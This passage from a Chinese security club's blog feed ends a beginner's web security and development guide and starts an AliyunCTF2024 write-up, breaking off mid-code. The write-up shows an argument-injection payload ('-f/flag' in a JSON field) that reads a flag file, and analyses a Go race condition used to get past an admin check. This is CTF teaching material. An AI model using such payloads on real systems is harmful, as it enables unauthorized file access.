src="https://img.ma5hr00m.top/blog/helloweb-portswigger.png" alt="helloweb-portswigger"></p><p>该靶场侧重让学习者了解并明白如何利用漏洞，并不是传统的 CTF 模式，所以没有找到 Flag 这一说，而是根据触发特定条件判断题目是否完成。靶场全英文。链接如下：</p><ul><li><a href="https://portswigger.net/web-security">PortSwigger WebSecurity Academy</a></li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>打 CTF 竞赛是社团活动的主要内容，但并不是全部，归根究底打比赛的目的也是学技术。在打比赛之外的时间，复现最新的漏洞或者一些老但知名的漏洞也是很好的学习方式。</p><p>CVE（Common Vulnerabilities and Exposures，通用漏洞和暴露）是公开披露的网络安全漏洞列表。它是由 MITRE 公司维护和更新的安全漏洞列表，并由美国国土安全部（DHS）和网络安全与基础设施安全局（CISA）赞助。在CVE中，每个漏洞都会有一个唯一的CVE编号，即CVE ID，例如“CVE-2019-1234567”。这个编号是识别漏洞的唯一标识符，供安全研究员和受攻击的软件供应商使用，以便确定和回应安全漏洞。CVE编号由CVE编号机构（CVE Numbering Authority，CNA）分配，CVE编号机构主要由IT供应商、安全厂商和安全研究组织承担。</p><p>我们一般所谓的复现漏洞，多数时候是指复现这些 CVE 漏洞，为了更好的理解这些漏洞的原理，我们会需要在本地搭建环境并进行模拟攻击。有时候自己搭环境会比较麻烦，网上找到的博客教程偶尔不靠谱。</p><p>推荐一个 phith0n 的漏洞复现 GitHub 仓库，里面收录了很多有价值的漏洞，并且提供了构建环境所需的 Dockerfile 和 docker-compose.yml 文件，以及复现方式，非常方便：</p><ul><li><a href="https://vulhub.org/#/environments/">Vulhub 官网</a> | <a href="https://github.com/vulhub/vulhub">Vulhub 仓库</a></li></ul><h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><blockquote><p>📞遵纪守法，<strong>任何渗透活动都应遵循相关的法律和道德准则</strong>。勿碰黑灰产。</p></blockquote><p>Web 渗透，也被称为 Web 渗透测试或 Web 渗透攻击，是一种评估网络应用安全性的方法。它涉及到模拟恶意攻击者的行为，以发现、利用和理解网络应用中的安全漏洞。</p><p>这块和 Red Team 关系更近，有兴趣的可以自行了解。一次完整的渗透包括很多环节：选定目标后，首先要做信息搜集，使用一些工具或搜索引擎搜集目标相关资产，包括子域名什么的，然后进行外围打点，看看能不能找到一些突破口，拿下外围设备后就可以尝试上传木马控制主机权限，做权限维持，如果可以的话再进行提权，然后扫描内网网段，看能不能进行横向或者纵向移动，尝试拿下更多内网主机……</p><p>如果你对渗透相关的安全内容感兴趣，可以通过以下两个靶场进行学习：</p><ul><li>国内：<a href="https://yunjing.ichunqiu.com/">春秋云镜 - 仿真场景</a></li><li>国外：<a href="https://app.hackthebox.com/">Hack The Box</a></li></ul><p>更推荐后者，Hack The Box 提供了更加系统的 Red&#x2F;Blue Team 的学习教程（全英文），以及对应的靶机实操练习。相信你可以从中找到乐趣。</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>Web 安全领域的工具实在是有“一点点”多，CTF、漏洞挖掘、渗透各自有各自的工具，相同功能的工具还有很多变种、不同团队的实现，该文档没法一一列举。此处就只列出最常用的安全工具，二选一即可：</p><ul><li><a href="https://portswigger.net/burp">BurpSuite - 成熟的⽹络安全⼯具</a></li><li><a href="https://yaklang.io/products/intro/">Yakit - 集成化单兵安全能⼒平台</a></li></ul><p>如果你对这两个⼯具尚不了解，可以在⽹上搜索⼀些相关使⽤教程，起步阶段对这些⼯具的要求不⾼，简单的抓包改包即可。BurpSuite 的学习可以结合前面提到的 PortSwigger 靶场。</p><h2 id="0x03-Web开发"><a href="#0x03-Web开发" class="headerlink" title="0x03 Web开发"></a>0x03 Web开发</h2><p>欢迎来到有趣的 Web 开发领域，前面已经介绍过 Web 领域中前后端的划分，从开发的角度来说，一般推荐挑选其中一个方向进行学习。一方面是因为前后端开发技术经过了很多年的发展，各自都有着深厚的技术积累，即使你不准备去了解那些已经过时的旧技术，近几年的新技术也足够你学习很长一段时间了；另一方面是因为人的精力终究是有限的，想在短时间内同时推进前后端的学习并想要有所建树，是一件相对困难的事情。当然跟随自己的兴趣来就好，刚开始都接触一下也不是什么坏事，说不准你就是下一个全栈大师。</p><p>但说实话，这东西也没什么固定的路数，协会 Web 成员在学习开发时的路线和技术栈也各不相同，没法提供一个同统一的路线。下文中的前后端开发入门都仅为编写文档的人的个人看法，请自行斟酌。</p><p>Web 前后端开发的学习过程差异较大，技术栈也少有重合，这里就分开介绍。</p><blockquote><p>🥳 HDU 有一个名为 <a href="https://www.hduhelp.cn/">HDUHelp 杭电助手</a> 的社团。你会发现，杭电的很多网络服务都是由杭电助手开发并维护的，该社团也会在新学期开始时展开招新活动，老东西会为技术部新人提供相对统一的学习路线指导，欢迎加入杭电助手技术部~</p></blockquote><blockquote><p>🔔 杭电助手后端部技术栈为 Golang；HDU 未央学社后端部技术栈为 Java。</p></blockquote><blockquote><p>🥰 Vidar-Team 与 HDUHelp 关系颇深，协会 Web 方向成员与 HDUHelp 技术部成员重合度很高。</p></blockquote><h3 id="前端开发"><a href="#前端开发" class="headerlink" title="前端开发"></a>前端开发</h3><p>前端开发对新手比较友好，因为你能直观地看到代码在浏览器中被渲染为页面，正反馈比较强，也不会说你学几天后做出来的东西没法给别人展示。</p><p>这里简单介绍下 Web 前端开发入门需要学哪些东西，之后的内容可以自行探索。</p><h4 id="原生三件套"><a href="#原生三件套" class="headerlink" title="原生三件套"></a>原生三件套</h4><p>前端开发的基础就是 <code>HTML</code> + <code>CSS</code> + <code>JavaScript</code>，后面应用框架的学习也要基于这三者。把网站的前端比作人体的话，HTML 就是骨骼，负责支撑起网站的整体架构；CSS 是皮肤，负责给予网站优雅的外观；JavaScript 则是肌肉，让网站具备动态交互的能力。推荐教程是 <a href="https://developer.mozilla.org/zh-CN/">MDN Web</a>，该站点是极其优质的 Web 前端开发知识库，认可度很高，很多流行前端框架的官方教程也把它作为 Web 前端领域中的 Wiki 来引用。</p><p>当然，MDN 对初学者的问题是，其内容过于正式，单个小节的内容过多以至于消磨掉初学者耐心。如果你想在短时间内快速过一遍 Web 前端的简要内容，可以看这个：<a href="https://www.runoob.com/">菜鸟教程</a>，精简很多，但内容不全且稍有过时。</p><p>在学习的过程中，你会发现前端的东西比较杂乱，原生 HTML 中就有几百个标签，不同类的标签往往又会有十几个不同的属性，不同属性还有不同的可选值，CSS 中的各种选择器、伪类伪元素以及几百个属性也足以让你头大。不过这些你不用去记，真正到应用开发过程中，你就会发现能用到的其实不多，第一次看的时候稍微留意一下，脑子里有个概念、知道大概有这么个东西就行，敲代码的时候忘了就去翻文档，毕竟开发时又不是断网环境，只要你能把应用功能实现，怎么搞都行。</p><p><code>JavaScript</code> 相对前两者重要一些，因为网页的主要功能都要使用 <code>JavaScript</code>（下文简称 JS）实现，之后接触的前端应用框架也主要是 JS 框架，包括后面如果你想以一个前端开发者的身份快速上手后端开发，基于 JS 语法的一系列 Node.js 后端框架也是你的首选。因此，你有必要多投入一些精力到 JS 的学习上。</p><p>这里推荐一份 JavaScript 的练习教程，跟着敲敲也蛮有帮助的，可以作为参考：<a href="https://javascript30.com/">JavaScript 30</a>。</p><h4 id="JavaScript框架"><a href="#JavaScript框架" class="headerlink" title="JavaScript框架"></a>JavaScript框架</h4><p>到了应用框架这层，你会发现——可选项更多了。开发者们整天轮子叠轮子的造，同一种功能的实现能给你整出来几十个大大小小的框架，开发者们也整天在社交媒体上因为技术选型而唇枪舌战。吵到今天，应用框架也大致分为了两派，分别是 Vue 和 React。</p><p>你可以在这两者中挑一个上手，这里不做推荐，自己去官网看看，考虑自己喜欢哪种风格之后再上手，反正之后两个都得会（乐）。学的时候跟着官方教程走就好，下面是二者的官方文档：</p><ul><li><a href="https://react.dev/">React</a> - <a href="https://zh-hans.react.dev/">React 官方中文文档</a></li><li><a href="https://vuejs.org/">Vue.js - 渐进式的 JavaScript 框架</a></li><li><a href="https://angular.cn/">Angular</a></li></ul><p>此外，当你上手前端应用框架时，就可以抛弃 JavaScript 而转向使用 TypeScript 了。</p><p>TypeScript（简称 TS）是微软公司开发的一种基于 JS 的编程语言，其目的是增强 JS 的功能，使其更适合多人合作的项目。TypeScript 可以看成是 JS 的超集（superset），即它继承了后者的全部语法。所有 JavaScript 脚本都可以当作 TypeScript 脚本（但是可能会报错），此外它再增加了一些自己的语法。</p><p>TS 对 JS 添加的最主要部分，就是一个独立的类型系统。JS 本身是有一套自己的类型系统，但其非常弱，运算符可以接受各种类型的值。这使得 JS 语法变得非常灵活，但客观上也增加了多人协同项目中出错的概率。在语法上，JS 属于动态类型语言。TS 引入了一个更强大、更严格的类型系统，属于静态类型语言。静态类型有利于代码的静态分析，更早地发现错误，提供了更好的 IDE 支持，做到语法提示和自动补全，提供了代码文档，有助于代码重构。</p><p>平心而论，很多项目其实没必要使用 TypeScript，严格的类型限制和语法要求会降低开发效率。但你架不住多人合作的时候别的前端开发都要用，以及有时候参加项目竞标或者比赛，其他组都用 TS，你一个人用 JS 把项目搞定了，很多不懂技术的评委也只会认为你不会，而不是你不屑于去用。关于到底使用 JS 还是 TS 也是一个长期争论的问题，自行决定。</p><blockquote><p>🧐这块的描述确实不太准确，其他 JS 框架比如 Angular 的使用者也不在少数，上文中提到的 React 严格来说只能算视图层面的库，其背后的 Next.js 才是官方主推的应用框架。不过这些对初学者来说不重要，先大致有个了解，学到后面接触到这些的时候再去调整自己的技术栈。</p></blockquote><h3 id="后端开发-Golang"><a href="#后端开发-Golang" class="headerlink" title="后端开发 - Golang"></a>后端开发 - Golang</h3><p>与前端相比，后端就主要是在于机器交流，你要操纵用户看不到的数据。后端没法做到像前端那样敲个代码立马就能看到反馈，不过胜在学习路线清晰，整体开发流程更加统一。</p><p>后端开发技术选型和语言关系比较大，此处以 Golang 为例进行介绍。</p><h4 id="上手"><a href="#上手" class="headerlink" title="上手"></a>上手</h4><p>Golang，也称为 Go 语言，是由 Google 开发的一种静态强类型、编译型语言。Go 语言的语法与 C 在许多方面相似，但它包含了垃圾回收的功能，且支持并发编程，同时更加简洁。这些优势使得 Go 在网络开发以及云原生方面有一些独特的优势。如果你学过 C 的话，Go 其实挺好上手的。</p><p>有以下两个推荐教程，不推荐看菜鸟教程，太浅了：</p><ul><li>在线学习 Golang 的网站，手把手教你一步步敲代码：<a href="https://tour.go-zh.org/welcome/1">Go 语言之旅</a></li><li>看书的话就选这本，<a href="https://golang-china.github.io/gopl-zh/">Golang 圣经</a></li></ul><p>在踏入下一步之前，你还有必要先了解 SQL。SQL，全称为 <strong>结构化查询语言</strong>（Structured Query Language），是一种用于管理关系数据库的标准编程语言。它包括一系列用于创建、修改、删除和查询数据库的命令。Web 后端应用基本都会有存储数据的需求，你不能把数十万条需要持久存储的数据一直保存在本地内存中，而是需要用类似 MySQL 这样的数据库帮存储你的数据。</p><ul><li><a href="https://www.w3school.com.cn/sql/index.asp">W3school SQL教程</a></li></ul><h4 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h4><p>当你熟悉 Golang 语法之后，就可以上手 Web 应用框架了。推荐给初学者的 Golang 后端三件套是 <code>Gin</code> + <code>Gorm</code> + <code>MySQL</code>，去看各自的官方教程即可。</p><p>Gin 是一个 Web 应用框架，这个都懂。开发者固然可以使用 Golang 自带的 <code>net/http</code> 处理客户端请求、处理并返回数据，但每次都这么做未免有些累赘；而且有时我们需要为某些 API 添加统一的鉴权，或者为所有处理请求事件添加日志记录，如果我们使用原生库去一个接口一个接口地去完成这些工作，那可就太费事费力了。</p><p>所以，经过积累，开发者们就将某些常用的功能，比如动态路由实现、分组控制、中间件、模板渲染与错误恢复等，将它们抽象出来并进行封装，打包成一个开箱即用的 Web 应用框架。当其他开发者想要实现某些功能时，直接导包引用该框架即可，这大幅提升了 Web 应用的开发效率，也在规范化和标准化等方面做出贡献。</p><ul><li><a href="https://gin-gonic.com/">Gin</a></li></ul><p>Gorm 是一个基于 Golang 开发的全功能 ORM 框架。那什么是 ORM 呢？你在学习 Golang 语法时或许已经知道该如何拼接 SQL 语句并进行数据库操作了，但这么搞的问题是效率低下，而且有些粗心的开发者疏于对用户传入数据的处理，可能会导致一些安全问题，比如 SQL 注入漏洞。</p><p>为了解决上述问题，ORM 应运而生。ORM 全称 <strong>对象关系映射</strong>（Object-Relational Mapping），是一种程序设计技术，用于实现面向对象编程语言里的对象和关系数据库之间的映射。有了 ORM，开发者可以直接使用面向对象的方式来操作数据库，无需编写 SQL 代码，大大提高了开发效率，框架自带的预处理等防范措施也提高了 Web 应用的安全性。当然，代价就是牺牲了一定的灵活性。</p><ul><li><a href="https://gorm.io/zh_CN/docs/index.html">GORM 指南</a></li></ul><p>此外，在你能够使用这三件套，以及其他库熟练地完成 CRUD 开发工作之后，我推荐你去读读这些框架的源码，从底层理解这些框架是如何实现数据处理以及其他功能的实现的，比如路由匹配的方式等等，然后尝试上手写写，自己实现。这个过程也是比较有趣的，你可以使用自己学习过的 Golang 语法与原生库结合，一步步地搭建出一个具备完备功能的 Framewok。如果你之前没有什么阅读源码的经验，也不知道何从下手，可以跟着下面这篇教程走，或许可以对你有所启发：</p><ul><li><a href="https://geektutu.com/post/gee.html">7天用Go从零实现Web框架Gee教程</a></li></ul><h3 id="后端开发-Java"><a href="#后端开发-Java" class="headerlink" title="后端开发 - Java"></a>后端开发 - Java</h3><h4 id="上手-1"><a href="#上手-1" class="headerlink" title="上手"></a>上手</h4><p>Java 这门编程语言你可能已经耳熟能详，毕竟这几年 Java 卖课的比较多（挠头）。它的跨平台性、面向对象的特性以及丰富的类库使其在编程语言中独树一帜。如果你对 C++ 或者 C# 有所了解，那么就会发现 Java 的语法与它们有许多相似之处。但是，Java 在设计上追求简洁和易读，因此去除了一些容易引发错误的概念，如指针和运算符重载等。如果你之前没学习过面向对象的语言，初次上手可能略有费劲。</p><p>推荐下学习资源，可以试试：</p><ul><li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744">Java教程 - 廖雪峰</a></li><li>黑马程序员Java零基础视频教程：<a href="https://www.bilibili.com/video/BV17F411T7Ao/?vd_source=d77df35177e7fa05ef5f9e0b6ddf2180">上部</a> &amp; <a href="https://www.bilibili.com/video/BV1yW4y1Y7Ms/?spm_id_from=333.788.recommend_more_video.0&vd_source=d77df35177e7fa05ef5f9e0b6ddf2180">下部</a></li></ul><h4 id="框架-1"><a href="#框架-1" class="headerlink" title="框架"></a>框架</h4><p>学完语法之后，就可以学习对应的后端服务框架了。对于 Java 后端开发，比较推荐的技术栈是 <code>Spring Boot</code> + <code>Hibernate</code> + <code>MySQL</code>。 </p><p>Spring Boot 是一个基于 Spring 框架的开源 Java 框架，它可以帮助你快速地创建出一个独立的、生产级别的 Spring 应用程序。学习资源推荐：</p><ul><li><a href="https://springdoc.cn/spring-boot/">Spring Boot 中文文档</a></li><li><a href="https://www.bilibili.com/video/BV15b4y1a7yG/?vd_source=d77df35177e7fa05ef5f9e0b6ddf2180">黑马程序员 SpringBoot2</a></li></ul><p>Hibernate 对 JDBC 进行了非常轻量级的对象封装，它将 POJO 与数据库表建立映射关系，是一个全自动的 ORM 框架，它可以帮助你更方便地操作数据库，而无需编写复杂的 SQL 代码。</p><ul><li><a href="https://hibernate.github.net.cn/">Hibernate 中文文档</a></li></ul><h4 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h4><p>再调过头来提一下 Java 安全。网上资料茫茫多，自己挑比较费时间，可以直接看下面推荐的这个教程，phith0n 出品，必属精品：</p><ul><li><a href="https://javasec.org/">攻击Java Web应用-[Java Web安全]</a></li></ul><p> 与此同时，phith0n 还建立了一个<a href="https://govuln.com/">“代码审计”知识星球</a>，是一个专业、前沿、原创的 Web 代码安全与审计讨论社区，专注于分享原创的代码安全知识、漏洞挖掘方法，感兴趣的可以加一下。截至本文文档更新时，星球价格为 299￥ 终身制，不过确实值这个钱。</p><h2 id="0x04-Network"><a href="#0x04-Network" class="headerlink" title="0x04 Network"></a>0x04 Network</h2><p>因为本文档讨论的主要是狭义上的 Web，Network 其实一般不会在此处提及。但因为 Network 在 Web 渗透领域的使用，以及 Vidar-Team 最近两届的网管都是 Web 手，所以本文档也单独划出 Network 的小节。</p><p>写这篇文档的人 Network 技术相对一般，这里就少啰嗦一些废话。如果你对计算机网络感兴趣但没有基础，可以自行学习 <a href="https://hdu-cs.wiki/9.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/9.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C">HDU-CS-WIKI 计算机网络</a> 章节的内容，可以快速的给你通一遍网络相关概念，方便你进一步的学习。</p><p>如果你对自己的网络水平有自信，并且有意向加入 Vidar-Team 成为下一届网管，就在招新群里吆喝一声，很快就可以吸引到 Vidar 历届网管的注意，线下交流讨论。</p><p>此外，HDU 有一个由学生自发创建的去中心化网络，名为<a href="https://dn11.top/">“DN11”</a>，欢迎有一定网络基础的学生加入。</p><p><img src="https://img.ma5hr00m.top/blog/helloweb-dn11.png" alt="helloweb-dn11"></p><h2 id="0x05-泛用技能"><a href="#0x05-泛用技能" class="headerlink" title="0x05 泛用技能"></a>0x05 泛用技能</h2><p>有些东西并不怎么成体系，但也是新生有必要知道的，同时又不怎么好分类，索性一块丢到这个小节下面。</p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>本文档是面向新手的教程，覆盖面有限，你可能想要更多相关资料。如果掌握了恰当的信息搜集⽅式，你就可以获得更多更优质的资源，实现更快的进步。</p><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><p>好的搜索引擎可以帮你检索出优质的学习资源，节约你在海量的⽂章中沙⾥淘⾦的时间。⾸推的搜索引擎是 <a href="https://www.google.com/">Google</a>，它可以帮助你搜集全球范围内符合你关键词的⽹⻚，并过滤掉⼀些⽆⽤的⼴告和只会 cv 的⽂章，快速定位到你需要的资源。</p><p>退⽽求其次，你也可以选择 Microsoft Bing，如果你从未接触过计算机技术，对你来说 <a href="https://www.bing.com/">Bing</a> 可能更⽅便访问。</p><p>如果你执着于使⽤<a href="https://www.baidu.com/">百度</a>，你可以利⽤⼀些搜索引擎默认的语法来规避掉不想看到的⽹⻚。⽐如 <code>SQLI⼊⻔教程 -csdn</code>，这样你的搜索结果中就不会出现 CSDN 相关⽂章。</p><h4 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h4><p>如果你对计算机感兴趣，你就不可避免的要接触 <a href="https://github.com/">GitHub</a>。GitHub 是⼀个⾯向开发⼈员的开源代码托管平台，它允许⽤⼾创建和管理他们的代码仓库，与其他开发⼈员协作。在 GitHub 上你能找到很多优秀的开源项⽬，以及⼀些有趣的学习资料，你甚⾄可以在这⾥体会到寻宝的快感，尽情地去了解世界上其他的程序员都在做些什么、在研究什么东西。这其中就有很多 Web ⽅向的学习资料，包括开发、安全等各个领域。</p><p>如果你有计算机⽅⾯的问题，你可以选择去 <a href="https://stackoverflow.com/">Stack Overflow</a>。Stack Overflow 是⼀个⾯向程序员的问答⽹站，它是 Stack Exchange ⽹络的旗舰站点。它由 Jeff Atwood 和 Joel Spolsky 于 2008 年创建，提供了关于计算机主题的问题和答案。Stack Overflow 是全球最⼤、最值得信赖的在线社区之⼀，开发⼈员可以在这⾥学习、分享他们的编程知识。在问答型 AI 流行起来之前，这就是全世界程序员最常用的寻求问题解决方案的地方。</p><h4 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h4><p>你可以使⽤最近流⾏的 AI 帮助你学习。⽬前常⻅的问答 AI 有 <a href="https://chat.openai.com/">Chatgpt</a>、New Bing 等，你可以借助它们来快速⼊⻔⼀个概念或者找到你问题的答案。</p><p>此外，有一些基于 AI 的搜索引擎也可以尝试，比如 <a href="https://devv.ai/">devv_</a>。</p><blockquote><p>😵请记住，不要把 AI 给你的回答当成真理，不要过度依赖 AI，它只是你的⼀个辅助⼯具。就像本文档开头所说的那样，你要保留 <strong>独⽴思考</strong> 的能⼒，什么事都问 AI 的结果就是你平滑的被 AI 取代。</p></blockquote><h3 id="Git版本管理工具"><a href="#Git版本管理工具" class="headerlink" title="Git版本管理工具"></a>Git版本管理工具</h3><p>Git 是一种<strong>分布式版本控制系统</strong>。它可以自动跟踪文件的变化、还原文件的历史记录、协调多人在同一个项目中工作，并且可以在必要情况下回溯到过去的任意版本。</p><p>在软件开发中，版本控制系统可以帮助开发人员有效地管理和维护代码库，支持项目的分支、合并等操作。这样，这允许不同的成员可以同时对同一个项目进行开发，而不会产生代码冲突等问题。此外，版本控制系统还可以提供更好的安全备份和恢复机制，以防止意外的数据丢失或代码损坏。</p><p>前文说过了 GitHub，经过简单的配置，你就可以使用 Git 将本地项目托管到 GitHub 平台，避免数据丢失的麻烦。</p><p>从这个网站学习 Git 的使用，手把手式教学：<a href="https://learngitbranching.js.org/">Learn Git Branching</a></p><h3 id="Linux操作系统"><a href="#Linux操作系统" class="headerlink" title="Linux操作系统"></a>Linux操作系统</h3><p>Linux 是一个操作系统。它由 <em>Linus</em> 于 1991 年构思设计而成。最初这只是他的一项兴趣爱好。 现如今，经过多年的发展，这项兴趣爱好已经成为了拥有最大用户群的操作系统。它自带强大的命令行工具，可以完成各种工作，比如文件操作、网络通信、进程管理等，而不需要使用图形化界面。 以前有很多设置你可能需要在 Windows 的系统设置里面翻来翻去，而在 Linux 下，你只需要打开命令行，敲一些指令就行。</p><p>此外，相比 Windows 系统，Linux 可以做到更加高效，更加安全，更加稳定，以及更小的损耗。 这些优势使得 Linux 在服务器领域占据了大量份额，对运维来说，熟练使用 Linux 是必备技能。</p><p>同时，Linux 还是一款开源的操作系统，每个人都可以下载其源代码进行定制。 这使得 Linux 有着强大的生命力，可以适应各种场景的需求，也促生了 Linux 活跃的社区生态。</p><p>现阶段，对大家来说，使用 Linux 最大的好处就是可以快速地搭建各种环境。你可以使用 <a href="https://www.vmware.com/">VMware</a> 或者 <a href="https://www.virtualbox.org/">VirtualBox</a> 等软件创建 Linux 虚拟机，也可以干脆直接上 Linux 物理机。对于 Web 方向的学习来说，Linux 系统的熟练使用属于必备技能。</p><h2 id="0x06-可选事项"><a href="#0x06-可选事项" class="headerlink" title="0x06 可选事项"></a>0x06 可选事项</h2><h3 id="个人博客"><a href="#个人博客" class="headerlink" title="个人博客"></a>个人博客</h3><p>推荐在个人博客记录⾃⼰的学习过程。在搭建博客的过程中你能学到很多有趣的知识。</p><p>比较推荐的用来搭建个人博客的框架有 <a href="https://hexo.io/zh-tw/">Hexo</a>、<a href="https://vitepress.dev/">Vitepress</a>、<a href="https://gohugo.io/">Hugo</a>、<a href="https://wordpress.com/zh-tw/">WordPress</a> 等，可以都看看，选择一个自己喜欢的用（搭建个人博客很多时候考虑的还是美观性）。如果你对自己的前端技术有自信，也可以自己写一个。</p><p>以下是几个高质量的杭电学长个人博客，可以看看他们的文章：</p><table><thead><tr><th>Name</th><th>Blog Link</th></tr></thead><tbody><tr><td>E99p1ant</td><td><a href="https://github.red/">https://github.red/</a></td></tr><tr><td>LoRexxar</td><td><a href="https://lorexxar.cn/">https://lorexxar.cn/</a></td></tr><tr><td>lightness</td><td><a href="https://lightless.me/">https://lightless.me/</a></td></tr><tr><td>Cyris</td><td><a href="https://cyris.moe/">https://cyris.moe/</a></td></tr><tr><td>Chuj</td><td><a href="https://www.cjovi.icu/">https://www.cjovi.icu/</a></td></tr><tr><td>daidr</td><td><a href="https://im.daidr.me/">https://im.daidr.me/</a></td></tr><tr><td>Nick Xu</td><td><a href="https://nickxu.me/">https://nickxu.me/</a></td></tr></tbody></table><p>此外，我们编辑个人博客时一般使用的是 <a href="https://markdown.tw/">Markdown</a> 格式，推荐学习一下。有很多 Markdown 编辑器可供选择，比如 <a href="https://typora.io/">Typora</a>、<a href="https://obsidian.md/">Obsidian</a>，直接使用 Visual Studio Code 配合插件也是可以的。</p><p>在编辑博客时，你可能需要插入一些图片。你可以选择将图片与 Markdown 存储在同一个仓库中，不过更推荐使用 OSS+PicGo 的组合搭一个图床，然后在 .md 文件中通过外链引用图片，具体操作可以参考这个教程：<a href="https://zhuanlan.zhihu.com/p/104152479">阿里云OSS PicGo 配置图床教程 超详细</a>。</p><blockquote><p>💸 警告，如果使用云存储服务搭建图床，建议使用 CDN 为外链引用添加限制，否则可能会有坏人刷你博客里的 OSS 外链图片，造成高额的经济损失。确保在有能力保护自己安全的情况下再用。</p></blockquote><h3 id="兔兔的小游戏"><a href="#兔兔的小游戏" class="headerlink" title="兔兔的小游戏"></a>兔兔的小游戏</h3><p>加⼊ Vidar-Team 招新群，你经常能看到可爱的兔兔机器⼈在帮助维持群内秩序，或者回答⼀些简单的问题。</p><p><img src="https://img.ma5hr00m.top/blog/helloweb-tutu.png" alt="helloweb-tutu"></p><p>兔兔迎新机器⼈还具有⼀个 <code>%blog</code> 命令，⽤于查询协会成员的博客链接。功能存在⼀个 SQLI 漏洞，通过这个漏洞可以查询出数据库中的 Flag。拿到 Flag 后可以私聊 Web 方向学长领取一杯奶茶哦~</p><h3 id="其他学习路线"><a href="#其他学习路线" class="headerlink" title="其他学习路线"></a>其他学习路线</h3><p>这是面向新生的文档，自然会有很多介绍不够细致的地方，不过我感觉已经够新生学一阵子的了。如果你还想要参考其他学习路线，可以点击下面这几个网址，这是在 GitHub上很火爆的 Roadmap，也可以提供路线的建议：</p><ul><li><a href="https://roadmap.sh/frontend">Frontend Developer Roadmap</a></li><li><a href="https://roadmap.sh/backend">Backend Developer Roadmap</a></li><li><a href="https://github.com/hideraldus13/roadmap-do-desenvolvedor-web">Roadmap do Desenvolvedor Web 2021</a></li></ul><h2 id="0x07-后话"><a href="#0x07-后话" class="headerlink" title="0x07 后话"></a>0x07 后话</h2><p>内容略多，希望你是耐⼼看到这⾥的。</p><p>Vidar 在本质上就是⼀群热爱信息安全的⼩伙伴自发成⽴的技术型团体，CTF 竞赛是我们⽇常活动的组成部分，并不是 Vidar 存在的唯⼀意义，你可以在这⾥尽情的研究你喜欢的技术，不仅是本⽂介绍的 Web，其他⼏个⽅向，以及较少提及的 IOT、区块链等都有学⻓在研究，你可以在这⾥轻松找到志同道合的朋友，⼀起学习。</p><p>另外，协会希望⼤家不要急于求成，要先打好基础。扎实的基础知识会是你未来发展道路上的铺路⽯。同时，也不能只着眼于理论知识，也要在实战中学习，边学边练才是健康的状态。</p><p>最后，再次欢迎对 Web 安全感兴趣的你！如果在学习过程中遇到困难，随时可以在招新群中提问，祝你在 Web 安全的学习道路上越⾛越远〜</p><blockquote><p>🏔️ 勿以浮沙筑⾼台，望学弟学妹们打牢基础，努力学习哇！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AliyunCTF2024 Writeup</title>
      <link href="/2024/04/21/2024/aliyunctf-2024/"/>
      <url>/2024/04/21/2024/aliyunctf-2024/</url>
      
        <content type="html"><![CDATA[<h2 id="writeup-ctf"><a href="#writeup-ctf" class="headerlink" title="writeup.ctf"></a>writeup.ctf</h2><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><p>命令注入题目，发 POST 请求时添加 <code>-f</code> 参数就能读取 <code>/flag</code>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span><span class="string">&quot;a.a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;-f/flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Pastbin"><a href="#Pastbin" class="headerlink" title="Pastbin"></a>Pastbin</h3><p>出题人基于 go1.22 原生库手搓了简易 Web 框架，但这个框架在实现路由时共用了一个底层 slice，导致 <code>c.mws</code> 可以被其他 goroutine 污染，也就是在 append 时实现数据竞争。</p><blockquote><p>之前对 Golang 的关注点一直在怎么用来写服务上，对于框架本身研究很渣，做题的时候也是在找有没有一些逻辑漏洞，盯着中间件这些瞎看，没什么成果。后来 Baimeow 上线看 Router 部分找到了这个公用 slice，搓了个脚本打出来了 flag.</p></blockquote><p>刚开始在源码里看到下面这段代码，想着是不是要选手去打 JWT，讨论之后发现走不通。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// No matter what the password is, you can not log in as admin</span></span><br><span class="line"><span class="comment">//// I think</span></span><br></pre></td></tr></table></figure><p>服务里有个鉴权中间件 <code>secureFlagMiddleware</code>，当用户访问 <code>/flag</code> 时会检查请求 token 里是否有 admin，如果没有会删掉返回值中的 flag 字段。然后在框架的 <code>Handle()</code> 函数中，可以发现这里有一个 <code>append</code> 操作，而 <code>c.mws</code> 在底层是被所有路由共用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// mws=&#123;[]func(http.Handler) http.Handler&#125;</span><br><span class="line"></span><br><span class="line">func (rtr *Router) Handle(method string, pattern string, handlers []Handler) &#123;</span><br><span class="line">    rtr.handle(method, pattern, func(resp http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">       c := rtr.m.createContext(resp, req)</span><br><span class="line">       for _, h := range 